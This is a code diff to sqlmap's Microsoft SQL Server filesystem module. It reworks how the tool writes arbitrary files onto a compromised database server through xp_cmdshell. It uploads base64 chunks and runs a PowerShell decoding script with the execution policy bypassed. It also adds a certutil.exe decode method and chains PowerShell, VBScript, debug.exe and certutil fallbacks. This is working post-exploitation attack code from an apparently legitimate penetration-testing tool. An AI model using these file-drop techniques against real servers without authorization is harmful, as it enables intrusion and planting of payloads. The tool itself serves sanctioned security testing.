@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2015 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
@@ -14,6 +14,7 @@ from lib.core.common import isTechniqueAvailable
 from lib.core.common import posixToNtSlashes
 from lib.core.common import randomStr
 from lib.core.common import readInput
+from lib.core.convert import base64encode
 from lib.core.convert import hexencode
 from lib.core.data import conf
 from lib.core.data import logger
@@ -72,7 +73,7 @@ class Filesystem(GenericFilesystem):
 
         logger.debug("generating chunk file %s\%s from debug script %s" % (tmpPath, chunkName, randScr))
 
-        commands = ("cd %s" % tmpPath, "debug < %s" % randScr, "del /F /Q %s" % randScr)
+        commands = ("cd \"%s\"" % tmpPath, "debug < %s" % randScr, "del /F /Q %s" % randScr)
         complComm = " & ".join(command for command in commands)
 
         self.execCmd(complComm)
@@ -165,27 +166,38 @@ class Filesystem(GenericFilesystem):
 
     def _stackedWriteFilePS(self, tmpPath, wFileContent, dFile, fileType):
         infoMsg = "using PowerShell to write the %s file content " % fileType
-        infoMsg += "to file '%s', please wait.." % dFile
+        infoMsg += "to file '%s'" % dFile
         logger.info(infoMsg)
 
-        randFile = "tmpf%s.txt" % randomStr(lowercase=True)
-        randFilePath = "%s\%s" % (tmpPath, randFile)
-        encodedFileContent = hexencode(wFileContent)
+        encodedFileContent = base64encode(wFileContent)
+        encodedBase64File = "tmpf%s.txt" % randomStr(lowercase=True)
+        encodedBase64FilePath = "%s\%s" % (tmpPath, encodedBase64File)
 
-        # TODO: need to be fixed
-        psString = "$s = gc '%s';$s = [string]::Join('', $s);$s = $s.Replace('`r',''); $s = $s.Replace('`n','');$b = new-object byte[] $($s.Length/2);0..$($b.Length-1) | %%{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes('%s',$b)" % (randFilePath, dFile)
-        psString = psString.encode('utf-16le')
-        psString = psString.encode("base64")[:-1].replace("\n", "")
+        randPSScript = "tmpps%s.ps1" % randomStr(lowercase=True)
+        randPSScriptPath = "%s\%s" % (tmpPath, randPSScript)
 
-        logger.debug("uploading the file hex-encoded content to %s, please wait.." % randFilePath)
+        wFileSize = len(encodedFileContent)
+        chunkMaxSize = 1024
 
-        self.xpCmdshellWriteFile(encodedFileContent, tmpPath, randFile)
+        logger.debug("uploading the base64-encoded file to %s, please wait.." % encodedBase64FilePath)
 
-        logger.debug("converting the file utilizing PowerShell EncodedCommand")
+        for i in xrange(0, wFileSize, chunkMaxSize):
+            wEncodedChunk = encodedFileContent[i:i + chunkMaxSize]
+            self.xpCmdshellWriteFile(wEncodedChunk, tmpPath, encodedBase64File)
 
-        commands = ("cd %s" % tmpPath,
-                     "powershell -EncodedCommand %s" % psString,
-                     "del /F /Q %s" % randFilePath)
+        psString = "$Base64 = Get-Content -Path \"%s\"; " % encodedBase64FilePath
+        psString += "$Base64 = $Base64 -replace \"`t|`n|`r\",\"\"; $Content = "
+        psString += "[System.Convert]::FromBase64String($Base64); Set-Content "
+        psString += "-Path \"%s\" -Value $Content -Encoding Byte" % dFile
+
+        logger.debug("uploading the PowerShell base64-decoding script to %s" % randPSScriptPath)
+        self.xpCmdshellWriteFile(psString, tmpPath, randPSScript)
+
+        logger.debug("executing the PowerShell base64-decoding script to write the %s file, please wait.." % dFile)
+
+        commands = ("powershell -ExecutionPolicy ByPass -File \"%s\"" % randPSScriptPath,
+                    "del /F /Q \"%s\"" % encodedBase64FilePath,
+                    "del /F /Q \"%s\"" % randPSScriptPath)
         complComm = " & ".join(command for command in commands)
 
         self.execCmd(complComm)
@@ -211,7 +223,6 @@ class Filesystem(GenericFilesystem):
             complComm = " & ".join(command for command in commands)
 
             self.execCmd(complComm)
-
         else:
             debugMsg = "the file is larger than %d bytes. " % debugSize
             debugMsg += "sqlmap will split it into chunks locally, upload "
@@ -233,14 +244,14 @@ class Filesystem(GenericFilesystem):
                 debugMsg += "%s\%s to %s file %s\%s" % (tmpPath, chunkName, fileType, tmpPath, dFileName)
                 logger.debug(debugMsg)
 
-                commands = ("cd %s" % tmpPath, copyCmd, "del /F %s" % chunkName)
+                commands = ("cd \"%s\"" % tmpPath, copyCmd, "del /F /Q %s" % chunkName)
                 complComm = " & ".join(command for command in commands)
 
                 self.execCmd(complComm)
 
             logger.debug("moving %s file %s to %s" % (fileType, sFile, dFile))
 
-            commands = ("cd %s" % tmpPath, "move /Y %s %s" % (dFileName, dFile))
+            commands = ("cd \"%s\"" % tmpPath, "move /Y %s %s" % (dFileName, dFile))
             complComm = " & ".join(command for command in commands)
 
             self.execCmd(complComm)
@@ -309,7 +320,7 @@ class Filesystem(GenericFilesystem):
         End Function""" % (randFilePath, dFile)
 
         vbs = vbs.replace("    ", "")
-        encodedFileContent = wFileContent.encode("base64")[:-1]
+        encodedFileContent = base64encode(wFileContent)
 
         logger.debug("uploading the file base64-encoded content to %s, please wait.." % randFilePath)
 
@@ -319,8 +330,35 @@ class Filesystem(GenericFilesystem):
 
         self.xpCmdshellWriteFile(vbs, tmpPath, randVbs)
 
-        commands = ("cd %s" % tmpPath, "cscript //nologo %s" % randVbs,
+        commands = ("cd \"%s\"" % tmpPath, "cscript //nologo %s" % randVbs,
                      "del /F /Q %s" % randVbs,
+                     "del /F /Q %s" % randFile)
+        complComm = " & ".join(command for command in commands)
+
+        self.execCmd(complComm)
+
+    def _stackedWriteFileCertutilExe(self, tmpPath, wFile, wFileContent, dFile, fileType):
+        infoMsg = "using certutil.exe to write the %s " % fileType
+        infoMsg += "file content to file '%s', please wait.." % dFile
+        logger.info(infoMsg)
+
+        chunkMaxSize = 500
+        dFileName = ntpath.basename(dFile)
+
+        randFile = "tmpf%s.txt" % randomStr(lowercase=True)
+        randFilePath = "%s\%s" % (tmpPath, randFile)
+
+        encodedFileContent = base64encode(wFileContent)
+
+        splittedEncodedFileContent = '\n'.join([encodedFileContent[i:i+chunkMaxSize] for i in xrange(0, len(encodedFileContent), chunkMaxSize)])
+
+        logger.debug("uploading the file base64-encoded content to %s, please wait.." % randFilePath)
+
+        self.xpCmdshellWriteFile(splittedEncodedFileContent, tmpPath, randFile)
+
+        logger.debug("decoding the file to %s.." % dFile)
+
+        commands = ("cd \"%s\"" % tmpPath, "certutil -f -decode %s %s" % (randFile, dFile),
                      "del /F /Q %s" % randFile)
         complComm = " & ".join(command for command in commands)
 
@@ -339,17 +377,34 @@ class Filesystem(GenericFilesystem):
         with open(wFile, "rb") as f:
             wFileContent = f.read()
 
-        self._stackedWriteFileVbs(tmpPath, wFileContent, dFile, fileType)
+        self._stackedWriteFilePS(tmpPath, wFileContent, dFile, fileType)
         written = self.askCheckWrittenFile(wFile, dFile, forceCheck)
 
         if written is False:
             message = "do you want to try to upload the file with "
-            message += "another technique? [Y/n] "
+            message += "the custom Visual Basic script technique? [Y/n] "
+            choice = readInput(message, default="Y")
+
+            if not choice or choice.lower() == "y":
+                self._stackedWriteFileVbs(tmpPath, wFileContent, dFile, fileType)
+                written = self.askCheckWrittenFile(wFile, dFile, forceCheck)
+
+        if written is False:
+            message = "do you want to try to upload the file with "
+            message += "the built-in debug.exe technique? [Y/n] "
             choice = readInput(message, default="Y")
 
             if not choice or choice.lower() == "y":
                 self._stackedWriteFileDebugExe(tmpPath, wFile, wFileContent, dFile, fileType)
-                #self._stackedWriteFilePS(tmpPath, wFileContent, dFile, fileType)
+                written = self.askCheckWrittenFile(wFile, dFile, forceCheck)
+
+        if written is False:
+            message = "do you want to try to upload the file with "
+            message += "the built-in certutil.exe technique? [Y/n] "
+            choice = readInput(message, default="Y")
+
+            if not choice or choice.lower() == "y":
+                self._stackedWriteFileCertutilExe(tmpPath, wFile, wFileContent, dFile, fileType)
                 written = self.askCheckWrittenFile(wFile, dFile, forceCheck)
 
         return written
